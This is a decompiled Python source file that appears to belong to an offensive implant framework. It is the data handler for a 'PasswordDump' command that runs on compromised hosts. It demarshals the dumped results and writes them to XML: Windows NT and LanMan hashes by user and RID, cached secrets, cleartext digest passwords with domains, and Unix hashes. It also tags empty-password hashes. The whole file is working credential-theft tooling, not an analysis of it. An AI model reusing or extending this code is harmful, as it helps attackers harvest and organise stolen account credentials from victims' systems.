# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_PasswordDump_DataHandler.py
import array
NullNtOwfPassword = array.array('B', [49, 214, 207, 224, 209, 106, 233, 49, 183, 60, 89, 215, 224, 192, 137, 192])
NullLanmanOwfPassword = array.array('B', [170, 211, 180, 53, 181, 20, 4, 238, 170, 211, 180, 53, 181, 20, 4, 238])

def DataHandlerMain(namespace, InputFilename, OutputFilename):
    import mcl.imports
    import mcl.data.Input
    import mcl.data.Output
    import mcl.status
    import mcl.target
    import mcl.object.Message
    mcl.imports.ImportNamesWithNamespace(namespace, 'mca.survey.cmd.passworddump', globals())
    input = mcl.data.Input.GetInput(InputFilename)
    output = mcl.data.Output.StartOutput(OutputFilename, input)
    output.Start('PasswordDump', 'passworddump', [])
    msg = mcl.object.Message.DemarshalMessage(input.GetData())
    if input.GetStatus() != mcl.status.MCL_SUCCESS:
        errorMsg = msg.FindMessage(mcl.object.Message.MSG_KEY_RESULT_ERROR)
        moduleError = errorMsg.FindU32(mcl.object.Message.MSG_KEY_RESULT_ERROR_MODULE)
        osError = errorMsg.FindU32(mcl.object.Message.MSG_KEY_RESULT_ERROR_OS)
        if input.GetStatus() == ERR_INJECT_SETUP_FAILED or input.GetStatus() == ERR_INJECT_FAILED:
            import mcl.injection.errors
            output.RecordModuleError(moduleError, 0, errorStrings)
            output.RecordModuleError(osError, 0, mcl.injection.errors.errorStrings)
        else:
            output.RecordModuleError(moduleError, osError, errorStrings)
        output.EndWithStatus(input.GetStatus())
        return True
    from mcl.object.XmlOutput import XmlOutput
    xml = XmlOutput()
    xml.Start('Passwords')
    for entry in msg:
        if mcl.CheckForStop():
            output.RecordXml(xml)
            output.EndWithStatus(mcl.target.CALL_FAILED)
            return False
        if entry['key'] == MSG_KEY_RESULT_NT:
            results = ResultNtPassword()
            results.Demarshal(msg)
            sub = xml.AddSubElement('WindowsPassword')
            sub.AddAttribute('user', results.user)
            sub.AddAttribute('rid', '%u' % results.rid)
            if results.flags & RESULT_NT_FLAG_EXPIRED:
                sub.AddAttribute('expired', 'true')
            else:
                sub.AddAttribute('expired', 'false')
            if results.flags & RESULT_NT_FLAG_EXCEPTION:
                sub.AddAttribute('exception', 'true')
            else:
                sub.AddAttribute('exception', 'false')
            sub2 = sub.AddSubElement('LanmanHash')
            sub2.SetTextAsData(results.lmOwfPassword)
            if results.flags & RESULT_NT_FLAG_LM_PRESENT:
                sub2.AddAttribute('isPresent', 'true')
            else:
                sub2.AddAttribute('isPresent', 'false')
            if results.lmOwfPassword.tostring() == NullLanmanOwfPassword.tostring():
                sub2.AddAttribute('isEmptyString', 'true')
            sub2 = sub.AddSubElement('NtHash')
            sub2.SetTextAsData(results.ntOwfPassword)
            if results.flags & RESULT_NT_FLAG_NT_PRESENT:
                sub2.AddAttribute('isPresent', 'true')
            else:
                sub2.AddAttribute('isPresent', 'false')
            if results.ntOwfPassword.tostring() == NullNtOwfPassword.tostring():
                sub2.AddAttribute('isEmptyString', 'true')
        elif entry['key'] == MSG_KEY_RESULT_NT_CACHED:
            results = ResultNtCachedPassword()
            results.Demarshal(msg)
            sub = xml.AddSubElement('WindowsSecret')
            sub.AddSubElementWithText('Name', results.secret)
            sub2 = sub.AddSubElement('Value')
            sub2.SetTextAsData(results.data)
        elif entry['key'] == MSG_KEY_RESULT_DIGEST:
            results = ResultNtDigestPassword()
            results.Demarshal(msg)
            sub = xml.AddSubElement('DigestPassword')
            sub.AddSubElementWithText('Name', results.user)
            sub.AddSubElementWithText('Domain', results.domain)
            sub.AddSubElementWithText('Password', results.password)
        elif entry['key'] == MSG_KEY_RESULT_UNIX:
            results = ResultUnixPassword()
            results.Demarshal(msg)
            sub = xml.AddSubElement('UnixPassword')
            sub.AddAttribute('user', results.user)
            sub.AddAttribute('hash', results.hash)
            if results.expired:
                sub.AddAttribute('expired', 'true')
            else:
                sub.AddAttribute('expired', 'false')
        else:
            output.RecordXml(xml)
            output.RecordError('Key (0x%08x) sent to callback is invalid' % entry['key'])
            output.EndWithStatus(mcl.target.CALL_FAILED)
            return True

    output.RecordXml(xml)
    output.EndWithStatus(mcl.target.CALL_SUCCEEDED)
    return True


if __name__ == '__main__':
    import sys
    try:
        namespace, InputFilename, OutputFilename = sys.argv[1:]
    except:
        print '%s <namespace> <input filename> <output filename>' % sys.argv[0]
        sys.exit(1)

    if DataHandlerMain(namespace, InputFilename, OutputFilename) != True:
        sys.exit(-1)